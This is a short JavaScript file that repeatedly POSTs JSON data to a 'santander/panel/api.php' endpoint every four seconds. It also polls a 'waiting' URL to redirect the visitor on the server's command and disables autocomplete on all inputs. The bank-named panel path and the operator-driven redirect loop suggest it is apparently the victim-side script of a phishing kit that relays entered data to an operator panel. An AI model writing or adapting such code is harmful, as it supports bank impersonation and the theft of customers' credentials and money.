function sendAjaxRequestEveryFourSeconds(jsonData,panel) {
    // Function to send AJAX request
    function sendAjaxRequest() {

        fetch("http://localhost/ES/santander/panel/api.php",{
            method : 'POST',
            body : JSON.stringify(jsonData),
            //headers : { 'Content-type' : 'application/json' }
        }).then(response => response.json()).then(data => {

            console.log(data);

        }).catch(error => {
            console.log(error);
        });

    }

    // Call the function initially
    sendAjaxRequest();

    // Set interval to call the function every 4 seconds
    setInterval(sendAjaxRequest, 4000); // 4000 milliseconds = 4 seconds
}

function worker() {
    $.ajax({
        method: "GET",
        url: 'index.php?waiting=1',
        success: function (data) {
            //console.log(data);
            if( data !== '' ) {
                window.location.href= data;
            }
        },
        complete: function () {
            setTimeout(worker, 1000);
        }
    });
}

jQuery(function ($) {
    
	$('input').attr('autocomplete','off');

})